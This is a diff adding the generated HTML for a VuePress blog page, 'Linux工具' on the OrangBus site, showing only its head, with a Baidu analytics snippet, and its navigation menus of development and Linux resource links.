@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Linux工具 | OrangBus</title>
+    <meta name="generator" content="VuePress 1.5.2">
+    <link rel="shortcut icon" href="/orangbus.ico" type="image/jpg">
+    <script><script>
+			var _hmt = _hmt || [];
+			(function() {
+			  var hm = document.createElement("script");
+			  hm.src = "https://hm.baidu.com/hm.js?75a195c58b50e00357efe9066f49f8b0";
+			  var s = document.getElementsByTagName("script")[0]; 
+			  s.parentNode.insertBefore(hm, s);
+			})();
+			</script>
+			</script>
+    <meta name="description" content="分享生活高效技能,保持勇敢，坚持有趣，生命不息，折腾不止！">
+    <meta property="article:modified_time" content="2023-04-27T02:37:25.000Z">
+    <meta property="og:site_name" content="OrangBus">
+    <meta property="og:title" content="Linux工具">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="/Linux/Tool.html">
+    <meta name="twitter:title" content="Linux工具">
+    <meta name="twitter:url" content="/Linux/Tool.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="keywords" content="html,css,jquery,thinkphp,laravel,docker,linux,manjaro">
+    <meta name="auther" content="OrangBus">
+    <link rel="preload" href="/assets/css/0.styles.8405cd42.css" as="style"><link rel="preload" href="/assets/js/app.ea451ed9.js" as="script"><link rel="preload" href="/assets/js/3.6c5e3284.js" as="script"><link rel="preload" href="/assets/js/22.b4f5a61f.js" as="script"><link rel="prefetch" href="/assets/js/10.36e3baf2.js"><link rel="prefetch" href="/assets/js/100.c62c728f.js"><link rel="prefetch" href="/assets/js/101.ae1ee2be.js"><link rel="prefetch" href="/assets/js/102.9cbe442f.js"><link rel="prefetch" href="/assets/js/103.865c8704.js"><link rel="prefetch" href="/assets/js/104.f2a95690.js"><link rel="prefetch" href="/assets/js/105.d1b44fe7.js"><link rel="prefetch" href="/assets/js/106.23035218.js"><link rel="prefetch" href="/assets/js/107.278448f9.js"><link rel="prefetch" href="/assets/js/108.a0ae7f91.js"><link rel="prefetch" href="/assets/js/109.cf958a7f.js"><link rel="prefetch" href="/assets/js/11.6e113d65.js"><link rel="prefetch" href="/assets/js/110.4abe4a81.js"><link rel="prefetch" href="/assets/js/111.d14fcb85.js"><link rel="prefetch" href="/assets/js/112.548bcab9.js"><link rel="prefetch" href="/assets/js/113.175d2143.js"><link rel="prefetch" href="/assets/js/114.ea5534cc.js"><link rel="prefetch" href="/assets/js/115.8fde4729.js"><link rel="prefetch" href="/assets/js/116.892c24fc.js"><link rel="prefetch" href="/assets/js/117.b6407011.js"><link rel="prefetch" href="/assets/js/118.e6b176a0.js"><link rel="prefetch" href="/assets/js/119.f5f2daa6.js"><link rel="prefetch" href="/assets/js/12.4a156561.js"><link rel="prefetch" href="/assets/js/120.9665106a.js"><link rel="prefetch" href="/assets/js/121.9796f87f.js"><link rel="prefetch" href="/assets/js/122.99ed8d50.js"><link rel="prefetch" href="/assets/js/123.178c8139.js"><link rel="prefetch" href="/assets/js/124.c5da5022.js"><link rel="prefetch" href="/assets/js/125.a471379a.js"><link rel="prefetch" href="/assets/js/126.b023af6d.js"><link rel="prefetch" href="/assets/js/127.1881be96.js"><link rel="prefetch" href="/assets/js/128.dc0cb30c.js"><link rel="prefetch" href="/assets/js/129.49a46e09.js"><link rel="prefetch" href="/assets/js/13.ffe35305.js"><link rel="prefetch" href="/assets/js/130.eb431321.js"><link rel="prefetch" href="/assets/js/131.d2e4e355.js"><link rel="prefetch" href="/assets/js/132.e06be357.js"><link rel="prefetch" href="/assets/js/133.a301aae1.js"><link rel="prefetch" href="/assets/js/134.d4f8d457.js"><link rel="prefetch" href="/assets/js/135.44b350c1.js"><link rel="prefetch" href="/assets/js/136.8c7e2989.js"><link rel="prefetch" href="/assets/js/137.1f1c660c.js"><link rel="prefetch" href="/assets/js/138.8cb25d26.js"><link rel="prefetch" href="/assets/js/139.f522c59c.js"><link rel="prefetch" href="/assets/js/14.d36de9de.js"><link rel="prefetch" href="/assets/js/140.017da4d3.js"><link rel="prefetch" href="/assets/js/141.e9e1855f.js"><link rel="prefetch" href="/assets/js/142.c45accfd.js"><link rel="prefetch" href="/assets/js/143.9ada7c7e.js"><link rel="prefetch" href="/assets/js/144.08072e47.js"><link rel="prefetch" href="/assets/js/145.c5e578ae.js"><link rel="prefetch" href="/assets/js/146.f7dd1b72.js"><link rel="prefetch" href="/assets/js/147.4b80c07c.js"><link rel="prefetch" href="/assets/js/148.f40aeae9.js"><link rel="prefetch" href="/assets/js/149.7643921b.js"><link rel="prefetch" href="/assets/js/15.62ba96c3.js"><link rel="prefetch" href="/assets/js/150.a9088b08.js"><link rel="prefetch" href="/assets/js/151.855b11a5.js"><link rel="prefetch" href="/assets/js/152.d513c64a.js"><link rel="prefetch" href="/assets/js/153.612f9549.js"><link rel="prefetch" href="/assets/js/154.54322c84.js"><link rel="prefetch" href="/assets/js/155.c612edbd.js"><link rel="prefetch" href="/assets/js/156.c0e99fa3.js"><link rel="prefetch" href="/assets/js/157.66027807.js"><link rel="prefetch" href="/assets/js/158.3b7ef7c0.js"><link rel="prefetch" href="/assets/js/159.2129b9f4.js"><link rel="prefetch" href="/assets/js/16.b3d1377d.js"><link rel="prefetch" href="/assets/js/160.81804cfd.js"><link rel="prefetch" href="/assets/js/161.b3f6a037.js"><link rel="prefetch" href="/assets/js/162.b50f19cf.js"><link rel="prefetch" href="/assets/js/17.5897ff24.js"><link rel="prefetch" href="/assets/js/18.bdf46b90.js"><link rel="prefetch" href="/assets/js/19.7abc88da.js"><link rel="prefetch" href="/assets/js/2.86f796bf.js"><link rel="prefetch" href="/assets/js/20.30b9f95b.js"><link rel="prefetch" href="/assets/js/21.86a8aad5.js"><link rel="prefetch" href="/assets/js/23.e5b7871f.js"><link rel="prefetch" href="/assets/js/24.861737df.js"><link rel="prefetch" href="/assets/js/25.461bdc07.js"><link rel="prefetch" href="/assets/js/26.1d1a614d.js"><link rel="prefetch" href="/assets/js/27.475c6b8a.js"><link rel="prefetch" href="/assets/js/28.ab8849ef.js"><link rel="prefetch" href="/assets/js/29.d1b58c6c.js"><link rel="prefetch" href="/assets/js/30.d2c71ed7.js"><link rel="prefetch" href="/assets/js/31.805bcd3c.js"><link rel="prefetch" href="/assets/js/32.4226174c.js"><link rel="prefetch" href="/assets/js/33.37be6a15.js"><link rel="prefetch" href="/assets/js/34.466ebcf5.js"><link rel="prefetch" href="/assets/js/35.cb9c230e.js"><link rel="prefetch" href="/assets/js/36.771f66ea.js"><link rel="prefetch" href="/assets/js/37.e443a86a.js"><link rel="prefetch" href="/assets/js/38.2af0dbd3.js"><link rel="prefetch" href="/assets/js/39.0c54ac88.js"><link rel="prefetch" href="/assets/js/4.e55e7d6c.js"><link rel="prefetch" href="/assets/js/40.e349bc43.js"><link rel="prefetch" href="/assets/js/41.2c82d80b.js"><link rel="prefetch" href="/assets/js/42.09865f77.js"><link rel="prefetch" href="/assets/js/43.d1a1945d.js"><link rel="prefetch" href="/assets/js/44.44056441.js"><link rel="prefetch" href="/assets/js/45.23f4bcb1.js"><link rel="prefetch" href="/assets/js/46.523377ed.js"><link rel="prefetch" href="/assets/js/47.39c2ac9b.js"><link rel="prefetch" href="/assets/js/48.446932bc.js"><link rel="prefetch" href="/assets/js/49.47b2cdc5.js"><link rel="prefetch" href="/assets/js/5.73b6d780.js"><link rel="prefetch" href="/assets/js/50.9cb1d170.js"><link rel="prefetch" href="/assets/js/51.4b7a3e4f.js"><link rel="prefetch" href="/assets/js/52.2310dbde.js"><link rel="prefetch" href="/assets/js/53.70514c3c.js"><link rel="prefetch" href="/assets/js/54.316cdc49.js"><link rel="prefetch" href="/assets/js/55.db4816c8.js"><link rel="prefetch" href="/assets/js/56.7241b38e.js"><link rel="prefetch" href="/assets/js/57.f947ebe6.js"><link rel="prefetch" href="/assets/js/58.3e277572.js"><link rel="prefetch" href="/assets/js/59.3476f0cf.js"><link rel="prefetch" href="/assets/js/6.49bd8bb9.js"><link rel="prefetch" href="/assets/js/60.6589e146.js"><link rel="prefetch" href="/assets/js/61.22492af7.js"><link rel="prefetch" href="/assets/js/62.1fc6799a.js"><link rel="prefetch" href="/assets/js/63.e3f9a2ca.js"><link rel="prefetch" href="/assets/js/64.1d1d0763.js"><link rel="prefetch" href="/assets/js/65.470a3295.js"><link rel="prefetch" href="/assets/js/66.4c1b39ef.js"><link rel="prefetch" href="/assets/js/67.882578f3.js"><link rel="prefetch" href="/assets/js/68.e37c1840.js"><link rel="prefetch" href="/assets/js/69.74668543.js"><link rel="prefetch" href="/assets/js/7.a146e8b1.js"><link rel="prefetch" href="/assets/js/70.3f357a01.js"><link rel="prefetch" href="/assets/js/71.1639510a.js"><link rel="prefetch" href="/assets/js/72.235a2ff5.js"><link rel="prefetch" href="/assets/js/73.b6403efb.js"><link rel="prefetch" href="/assets/js/74.8028105e.js"><link rel="prefetch" href="/assets/js/75.8317d79b.js"><link rel="prefetch" href="/assets/js/76.2bcfe34f.js"><link rel="prefetch" href="/assets/js/77.8a0fa722.js"><link rel="prefetch" href="/assets/js/78.dfb11693.js"><link rel="prefetch" href="/assets/js/79.4c573711.js"><link rel="prefetch" href="/assets/js/8.361bf975.js"><link rel="prefetch" href="/assets/js/80.ae55b008.js"><link rel="prefetch" href="/assets/js/81.fcf62caf.js"><link rel="prefetch" href="/assets/js/82.c75bff49.js"><link rel="prefetch" href="/assets/js/83.bc4cf04e.js"><link rel="prefetch" href="/assets/js/84.6e7b5e11.js"><link rel="prefetch" href="/assets/js/85.6b48a9e4.js"><link rel="prefetch" href="/assets/js/86.7a637af9.js"><link rel="prefetch" href="/assets/js/87.92ca344e.js"><link rel="prefetch" href="/assets/js/88.31ecec95.js"><link rel="prefetch" href="/assets/js/89.c5bde116.js"><link rel="prefetch" href="/assets/js/9.17b1e357.js"><link rel="prefetch" href="/assets/js/90.a41fd3df.js"><link rel="prefetch" href="/assets/js/91.46a2cc9e.js"><link rel="prefetch" href="/assets/js/92.761117f0.js"><link rel="prefetch" href="/assets/js/93.40eecc87.js"><link rel="prefetch" href="/assets/js/94.7de38523.js"><link rel="prefetch" href="/assets/js/95.372f7ca9.js"><link rel="prefetch" href="/assets/js/96.850a8aca.js"><link rel="prefetch" href="/assets/js/97.d3f7516f.js"><link rel="prefetch" href="/assets/js/98.b00ac6e4.js"><link rel="prefetch" href="/assets/js/99.aa632710.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.8405cd42.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/orangbus.png" alt="OrangBus" class="logo"> <span class="site-name can-hide">OrangBus</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
+  Home
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Window" class="dropdown-title"><span class="title">Window</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/Window/" class="nav-link">
+  高效工具
+</a></li><li class="dropdown-item"><!----> <a href="https://pc.qq.com" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  软件中心
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><h4>
+          开发工具
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://www.jetbrains.com/toolbox-app/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  jetbrains
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://laragon.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  laragon
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://www.php.net/downloads.php" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  php版本安装
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://pecl.php.net/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  php扩展
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Linux" class="dropdown-title"><span class="title">Linux</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/Linux/Config.html" class="nav-link">
+  配置文件
+</a></li><li class="dropdown-item"><!----> <a href="/Linux/Tool.html" aria-current="page" class="nav-link router-link-exact-active router-link-active">
+  生产工具
+</a></li><li class="dropdown-item"><!----> <a href="/Linux/App.html" class="nav-link">
+  应用
+</a></li><li class="dropdown-item"><!----> <a href="/Linux/SedAwk.html" class="nav-link">
+  SedAwk
+</a></li><li class="dropdown-item"><!----> <a href="/Linux/Question.html" class="nav-link">
+  问题解答
+</a></li><li class="dropdown-item"><!----> <a href="https://github.com/orangbus/tool" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Manjaro入门到生产
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><h4>
+          开发环境
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="http://laradock.io" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Laradock
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://www.bt.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  宝塔Linux面板
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://laragon.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  laragon-window
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li><li class="dropdown-item"><h4>
+          Linux发行版
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://www.centos.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  centos
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://www.deepin.org/zh/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Deepin
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://cn.ubuntu.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Ubuntu
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://manjaro.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Manjaro
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li><li class="dropdown-item"><h4>
+          Laradock实战
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://yeasy.gitbooks.io/docker_practice/install/mirror.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Docker入门到实战
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="http://laradock.io" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Laradock官网
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://labs.play-with-docker.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Docker在线学习调试
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://labs.play-with-k8s.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  play with Kubernetes
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Code" class="dropdown-title"><span class="title">Code</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Html
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/Code/RequireJs.html" class="nav-link">
+  RequireJs
+</a></li><li class="dropdown-subitem"><a href="/Code/Layui.html" class="nav-link">
+  Layui笔记
+</a></li><li class="dropdown-subitem"><a href="/Code/Javascript.html" class="nav-link">
+  Javascript手册
+</a></li><li class="dropdown-subitem"><a href="/Code/Css.html" class="nav-link">
+  Css样式收藏
+</a></li><li class="dropdown-subitem"><a href="/Code/Menu.html" class="nav-link">
+  在线手册
+</a></li></ul></li><li class="dropdown-item"><!----> <a href="/Code/VueNote.html" class="nav-link">
+  Vue
+</a></li><li class="dropdown-item"><h4>
+          Php
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/Code/Php.html" class="nav-link">
+  Php使用技巧
+</a></li><li class="dropdown-subitem"><a href="/Code/Thinkphp.html" class="nav-link">
+  ThinkPhp
+</a></li><li class="dropdown-subitem"><a href="/Code/LaraCode.html" class="nav-link">
+  LaraCode
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Python
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/Python/Python.html" class="nav-link">
+  Python入门
+</a></li><li class="dropdown-subitem"><a href="/Python/Scrapy.html" class="nav-link">
+  Scrapy
+</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/Docker/" class="nav-link">
+  Docker
+</a></div><div class="nav-item"><a href="/Mysql/" class="nav-link">
+  Mysql
+</a></div><div class="nav-item"><a href="/Vue/" class="nav-link">
+  Vue
+</a></div><div class="nav-item"><a href="/Golang/" class="nav-link">
+  Golang
+</a></div><div class="nav-item"><a href="/MyNote/" class="nav-link">
+  MyNote
+</a></div><div class="nav-item"><a href="/WebNote/" class="nav-link">
+  WebNote
+</a></div><div class="nav-item"><a href="/OrangBus/" class="nav-link">
+  OrangBus
+</a></div> <a href="https://github.com/orangbus/vuepress-blog" target="_blank" rel="noopener noreferrer" class="repo-link">
+    查看源码
+    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
+  Home
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Window" class="dropdown-title"><span class="title">Window</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/Window/" class="nav-link">
+  高效工具
+</a></li><li class="dropdown-item"><!----> <a href="https://pc.qq.com" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  软件中心
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><h4>
+          开发工具
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://www.jetbrains.com/toolbox-app/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  jetbrains
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://laragon.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  laragon
